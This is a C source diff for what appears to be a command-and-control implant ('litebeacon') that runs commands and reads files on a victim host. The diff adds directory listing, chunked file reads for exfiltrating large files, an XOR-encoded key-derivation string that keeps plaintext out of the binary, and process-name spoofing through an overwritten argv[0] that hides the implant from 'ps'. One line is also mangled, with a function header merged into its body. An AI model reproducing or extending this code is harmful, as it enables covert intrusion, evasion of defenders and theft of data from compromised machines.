@@ -10,8 +10,6 @@
 #error "this build only targets little-endian"
 #endif
 
-#define AEAD_CTX "lite/aead/v1" /* must match keyCtx in server/litebeacon/crypto.go */
-
 #define TLV_ID        0x01
 #define TLV_TS        0x02
 #define TLV_PAD       0x0f
@@ -22,11 +20,13 @@
 #define TLV_PID       0x14
 #define TLV_EXEC_RES  0x20
 #define TLV_FILE_RES  0x30
+#define TLV_DIR_RES   0x31
 #define TLV_EXEC_TASK 0x40
 #define TLV_READ_TASK 0x41
 #define TLV_SLEEP_TASK 0x42
 #define TLV_EXIT_TASK 0x43
 #define TLV_NEXT_HINT 0x44
+#define TLV_LIST_TASK 0x45
 
 static char g_url[512];
 static char g_ua[192];
@@ -35,11 +35,26 @@ static unsigned char g_key[32];
 static char g_id[17];
 static unsigned int g_interval;
 static int g_exact; /* 1 = 干活：按 g_interval 整秒睡，不再乘浮动 */
+static char *g_argv0;      /* 运行时伪装：ps -f 显示的是这块内存 */
+static size_t g_argv0_len;
 
 static void deob(const unsigned char *in, size_t n, char *out) {
     size_t i;
     for (i = 0; i < n; i++) out[i] = (char)(in[i] ^ CFG_XOR);
     out[n] = '\0';
+}
+
+/* Domain-separation salt for AEAD key derivation. Encoded so the plaintext
+   does not sit in .rodata; decoded bytes must match server keyCtx. */
+#define CTX_LEN 12
+static void reveal_ctx(char *out) {
+    static const unsigned char enc[CTX_LEN] = {
+        0xc9, 0xcc, 0xd1, 0xc0, 0x8a, 0xc4, 0xc0, 0xc4, 0xc1, 0x8a, 0xd3, 0x94
+    };
+    volatile unsigned char xk = 0xa5;
+    size_t i;
+    for (i = 0; i < CTX_LEN; i++) out[i] = (char)(enc[i] ^ xk);
+    out[CTX_LEN] = '\0';
 }
 
 /* ---- growable byte buffer ---- */
@@ -233,26 +248,47 @@ static void do_exec_task(uint32_t task_id, const char *cmd, int timeout_sec, buf
     free(out);
 }
 
-static void do_read_task(uint32_t task_id, const char *path, buf_t *results) {
+static void do_read_task(uint32_t task_id, const char *path, uint32_t offset, buf_t *results) {
     unsigned char *out = NULL;
     size_t out_len = 0;
+    uint32_t total = 0;
     int err_code = 0;
     buf_t val = {0, 0, 0};
     unsigned char eb;
 
-    read_file_bytes(path, &out, &out_len, &err_code);
+    read_file_chunk(path, offset, &out, &out_len, &total, &err_code);
     buf_raw(&val, &task_id, 4);
     eb = (unsigned char)err_code;
     buf_raw(&val, &eb, 1);
+    buf_raw(&val, &offset, 4);
+    buf_raw(&val, &total, 4);
     if (!err_code && out && out_len) buf_raw(&val, out, out_len);
     buf_tlv(results, TLV_FILE_RES, val.data ? val.data : (const unsigned char *)"", val.len);
     free(val.data);
     free(out);
 }
 
+static void do_list_task(uint32_t task_id, const char *path, buf_t *results) {
+    unsigned char *out = NULL;
+    size_t out_len = 0;
+    int err_code = 0, truncated = 0;
+    unsigned char eb, tb;
+    buf_t val = {0, 0, 0};
+
+    list_dir(path && path[0] ? path : ".", &out, &out_len, &err_code, &truncated);
+    buf_raw(&val, &task_id, 4);
+    eb = (unsigned char)err_code;
+    tb = (unsigned char)truncated;
+    buf_raw(&val, &eb, 1);
+    buf_raw(&val, &tb, 1);
+    if (!err_code && out && out_len) buf_raw(&val, out, out_len);
+    buf_tlv(results, TLV_DIR_RES, val.data ? val.data : (const unsigned char *)"", val.len);
+    free(val.data);
+    free(out);
+}
+
 /* TLV strings are length-delimited, not NUL-terminated: copy + terminate. */
-static char *tlv_str(const unsigned char *src, size_t n) {
-    char *s = (char *)malloc(n + 1);
+static char *tlv_str(const unsigned char *src, size_t n) {    char *s = (char *)malloc(n + 1);
     if (!s) return NULL;
     memcpy(s, src, n);
     s[n] = '\0';
@@ -289,12 +325,32 @@ static void run_tasks(const buf_t *tasks, buf_t *results) {
         case TLV_READ_TASK:
             if (ran >= MAX_TASKS || results->len >= (size_t)RESULT_CAP) break;
             if (n >= 4) {
+                uint32_t task_id, offset = 0;
+                size_t path_off = 4;
+                char *path;
+                memcpy(&task_id, v, 4);
+                /* 新协议：[id:4][offset:4][path]。旧服务端没有 offset，按 0 读。 */
+                if (n >= 8) {
+                    memcpy(&offset, v + 4, 4);
+                    path_off = 8;
+                }
+                path = tlv_str(v + path_off, n - path_off);
+                if (path) {
+                    do_read_task(task_id, path, offset, results);
+                    free(path);
+                    ran++;
+                }
+            }
+            break;
+        case TLV_LIST_TASK:
+            if (ran >= MAX_TASKS || results->len >= (size_t)RESULT_CAP) break;
+            if (n >= 4) {
                 uint32_t task_id;
                 char *path;
                 memcpy(&task_id, v, 4);
                 path = tlv_str(v + 4, n - 4);
                 if (path) {
-                    do_read_task(task_id, path, results);
+                    do_list_task(task_id, path, results);
                     free(path);
                     ran++;
                 }
@@ -340,7 +396,7 @@ static double next_interval(void) {
     return (double)g_interval * rand_uniform(0.5, 3.0);
 }
 
-int main(void) {
+int main(int argc, char **argv) {
     char hostname[256] = {0}, username[256] = {0}, os[128] = {0}, arch[64] = {0};
     unsigned char secret[33]; /* 33: deob 在末尾补 NUL */
     unsigned char idhash[32];
@@ -360,8 +416,34 @@ int main(void) {
     g_interval = CFG_INTERVAL;
     if (g_interval == 0) g_interval = 180;
 
-    buf_raw(&kctx, secret, 32);
-    buf_raw(&kctx, AEAD_CTX, strlen(AEAD_CTX));
+    if (argc > 0 && argv[0] != NULL) {
+        g_argv0 = argv[0];
+        g_argv0_len = strlen(argv[0]);
+    }
+#ifdef CFG_PNAME
+    {
+        char pname[CFG_PNAME_LEN + 1];
+        size_t n;
+        deob(CFG_PNAME, CFG_PNAME_LEN, pname);
+        sys_set_procname(pname);
+        /* 只能原地改写：argv 内存块后面紧跟环境区，不能越界。 */
+        if (g_argv0) {
+            n = strlen(pname);
+            if (n > g_argv0_len) n = g_argv0_len;
+            memcpy(g_argv0, pname, n);
+            g_argv0[n] = '\0';
+        }
+        memset(pname, 0, sizeof pname);
+    }
+#endif
+
+    {
+        char ctx[CTX_LEN + 1];
+        reveal_ctx(ctx);
+        buf_raw(&kctx, secret, 32);
+        buf_raw(&kctx, ctx, CTX_LEN);
+        memset(ctx, 0, sizeof ctx);
+    }
     if (sha256(kctx.data, kctx.len, g_key) != 0) return 1;
     free(kctx.data);
 
